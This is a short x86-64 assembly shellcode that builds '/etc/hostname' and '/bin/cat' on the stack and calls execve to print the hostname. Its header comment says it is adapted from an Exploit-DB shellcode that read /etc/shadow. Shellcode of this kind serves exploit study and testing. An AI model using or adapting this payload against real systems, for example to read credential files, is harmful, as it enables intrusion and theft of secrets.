;orginal version :https://www.exploit-db.com/shellcodes/49547   
;change from original:pushed hostname instead odf shadow

global _start

section .text

_start:

    xor esi, esi
    mul esi

    ; "/etc/hostname"

    push rax

    mov rcx, 0x656d616e74736f68
    push rcx

    mov rcx, 0x2f6374652f2f2f2f
    push rcx

    mov r8, rsp

    ; "/bin/cat"

    push rax

    mov rcx, 0x7461632f6e69622f
    push rcx

    mov rdi, rsp

    ; argv[]

    push rax
    push r8
    push rdi

    mov rsi, rsp

    mov al, 59
    syscall
